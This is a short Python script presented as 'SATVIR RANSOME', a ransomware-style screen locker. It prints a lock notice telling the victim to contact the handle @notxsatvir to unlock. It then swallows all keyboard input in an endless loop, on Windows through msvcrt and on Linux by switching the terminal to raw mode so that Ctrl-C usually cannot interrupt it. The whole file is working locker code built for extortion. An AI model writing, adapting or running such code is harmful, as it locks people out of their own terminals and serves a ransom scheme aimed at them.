#!/usr/bin/env python3
# work.py - Disables all user interaction

import os
import time
import sys

def freeze_screen():
    print("❄️ SATVIR RANSOME - Screen Freeze")
    print("="*40)
    print("⚠️ No interaction allowed")
    print("📞 Contact @notxsatvir to unlock")
    print("="*40)
    
    # Keep terminal busy
    try:
        while True:
            # Read input but ignore
            if os.name == 'nt':
                # Windows
                import msvcrt
                while msvcrt.kbhit():
                    msvcrt.getch()
            else:
                # Linux/Unix
                import termios, tty, sys
                fd = sys.stdin.fileno()
                old_settings = termios.tcgetattr(fd)
                tty.setraw(fd)
                try:
                    while True:
                        sys.stdin.read(1)
                finally:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    except KeyboardInterrupt:
        print("\n🔓 Unlocked by admin")
        sys.exit(0)

if __name__ == "__main__":
    freeze_screen()